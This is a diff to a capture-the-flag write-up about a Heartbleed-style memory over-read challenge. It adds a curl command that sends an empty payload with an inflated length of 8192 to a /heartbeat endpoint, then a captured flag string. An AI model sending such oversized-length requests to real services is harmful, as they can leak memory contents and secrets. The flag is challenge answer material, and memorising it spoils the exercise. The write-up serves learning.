@@ -64,11 +64,17 @@ So I tried sending an empty payload with a huge length. At first the response wa
 but after filtering for `flag/CTF`, the actual flag appeared right after the junk.
 
 ## Exploit command
+<img width="940" height="64" alt="image" src="https://github.com/user-attachments/assets/6da68724-4552-48c5-ba79-3729fb43ac6b" />
+
 ```bash
 # oversize request, Windows CMD with findstr
 curl -s http://host:port/heartbeat -H "Content-Type: application/json" -d "{\"payload\":\"\",\"length\":8192}" | findstr /i "flag CTF GCTF"
 ```
-
 ## Flag found
-<img width="940" height="64" alt="image" src="https://github.com/user-attachments/assets/6da68724-4552-48c5-ba79-3729fb43ac6b" />
+
+```flag
+GCTF25{aK4mI_H3ARTY_tl$SU3_saD_so_$AD_c1737cad162e}
+```
+
+
 
